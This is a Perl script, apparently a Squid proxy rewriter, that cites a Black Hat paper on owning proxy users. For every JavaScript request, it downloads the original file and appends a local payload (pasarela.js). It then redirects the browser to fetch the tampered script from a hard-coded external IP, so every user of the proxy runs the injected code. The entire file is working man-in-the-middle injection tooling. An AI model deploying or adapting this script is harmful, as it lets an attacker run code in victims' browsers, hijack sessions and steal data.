#!/usr/bin/perl

# REF: http://media.blackhat.com/bh-us-12/Briefings/Alonso/BH_US_12_Alonso_Owning_Bad_Guys_WP.pdf

$|=1;
$count = 0;
$pid = $$;

while (<>)
{
	chomp $_;
	if ($_ =~ /(.*\.js)/i)
	{
	
		$url = $1;
		system("/usr/bin/wget", "-q", "-O", "/var/www/html/tmp/$pid-$count.js", "$url");
		system("chmod o+r /var/www/html/tmp/$pid-$count.js");
		system("cat /etc/squid3/pasarela.js >> /var/www/html/tmp/$pid-$count.js");
		print "http://23.253.239.36:80/tmp/$pid-$count.js\n"; # REPLACE_IP
	}
	else
	{
		print "$_\n";
	}
	$count++;
}
